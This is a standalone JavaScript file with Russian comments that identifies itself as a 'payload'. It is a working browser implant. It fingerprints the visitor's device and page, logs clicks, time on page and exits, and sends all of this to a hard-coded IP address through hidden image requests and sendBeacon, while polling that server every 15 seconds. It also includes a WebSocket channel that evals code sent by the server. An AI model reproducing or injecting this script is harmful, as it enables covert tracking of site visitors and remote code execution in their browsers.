(function() {
    var PAYLOAD_ID = '4ff7d8ec41e3facd';
    var TIMESTAMP = 1769597947673;
    var USE_WS = false;
    var WS_URL = '';
    var POLL_URL = 'http://2.133.241.191:8443';
    
    // Собираем информацию об устройстве
    function collectDeviceInfo() {
        var info = {
            id: PAYLOAD_ID,
            type: 'handshake',
            timestamp: new Date().toISOString(),
            device: {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight
                },
                touch: 'ontouchstart' in window
            },
            location: {
                href: window.location.href,
                hostname: window.location.hostname,
                referrer: document.referrer
            }
        };
        
        // Пытаемся получить больше данных
        if (navigator.connection) {
            info.device.connection = {
                type: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink
            };
        }
        
        if (navigator.deviceMemory) {
            info.device.memory = navigator.deviceMemory;
        }
        
        if (navigator.hardwareConcurrency) {
            info.device.cores = navigator.hardwareConcurrency;
        }
        
        return info;
    }
    
    // Отправка данных через Image (самый надёжный способ)
    function sendData(data) {
        var url = POLL_URL + '/ping?id=' + PAYLOAD_ID;
        if (data) {
            url += '&data=' + encodeURIComponent(JSON.stringify(data).substring(0, 2000));
        }
        
        // Создаём невидимое изображение
        var img = new Image();
        img.src = url;
        img.style.display = 'none';
        img.onload = function() { document.body.removeChild(img); };
        img.onerror = function() { document.body.removeChild(img); };
        document.body.appendChild(img);
        
        // Дублируем через fetch на всякий случай
        if (navigator.sendBeacon) {
            var formData = new FormData();
            formData.append('id', PAYLOAD_ID);
            if (data) formData.append('data', JSON.stringify(data));
            navigator.sendBeacon(POLL_URL + '/data', formData);
        }
    }
    
    // WebSocket (если настроен)
    function setupWebSocket() {
        if (!USE_WS || !WS_URL) return;
        
        try {
            var ws = new WebSocket(WS_URL);
            
            ws.onopen = function() {
                ws.send(JSON.stringify(collectDeviceInfo()));
            };
            
            ws.onmessage = function(event) {
                try {
                    var cmd = JSON.parse(event.data);
                    if (cmd.type === 'execute') {
                        try {
                            var result = eval(cmd.code);
                            ws.send(JSON.stringify({
                                type: 'result',
                                cmdId: cmd.id,
                                result: result
                            }));
                        } catch(e) {}
                    }
                } catch(e) {}
            };
            
            ws.onerror = function() {
                setTimeout(setupWebSocket, 5000);
            };
            
            ws.onclose = function() {
                setTimeout(setupWebSocket, 5000);
            };
        } catch(e) {}
    }
    
    // HTTP Polling (работает всегда)
    function setupPolling() {
        if (!true) return;
        
        // Отправляем начальную информацию
        sendData(collectDeviceInfo());
        
        // Периодический опрос сервера
        setInterval(function() {
            var img = new Image();
            img.src = POLL_URL + '/poll?id=' + PAYLOAD_ID + '&t=' + Date.now();
            img.style.display = 'none';
            document.body.appendChild(img);
            setTimeout(function() { 
                if (img.parentNode) document.body.removeChild(img); 
            }, 100);
        }, 15000); // Опрос каждые 15 секунд
        
        // Собираем данные о времени на странице
        setInterval(function() {
            var timeData = {
                id: PAYLOAD_ID,
                type: 'time_update',
                timeSpent: Math.floor((Date.now() - TIMESTAMP) / 1000),
                pageActive: !document.hidden
            };
            sendData(timeData);
        }, 30000);
    }
    
    // Основная инициализация
    function init() {
        // 1. WebSocket
        setupWebSocket();
        
        // 2. HTTP Polling
        setupPolling();
        
        // 3. Отслеживаем действия пользователя
        document.addEventListener('click', function(e) {
            var clickData = {
                id: PAYLOAD_ID,
                type: 'click',
                target: e.target.tagName,
                x: e.clientX,
                y: e.clientY
            };
            sendData(clickData);
        });
        
        // 4. Отправляем данные при закрытии
        window.addEventListener('beforeunload', function() {
            var exitData = {
                id: PAYLOAD_ID,
                type: 'page_exit',
                totalTime: Math.floor((Date.now() - TIMESTAMP) / 1000)
            };
            sendData(exitData);
        });
        
        console.log('[Payload] Initialized: ' + PAYLOAD_ID);
    }
    
    // Запускаем после загрузки страницы
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();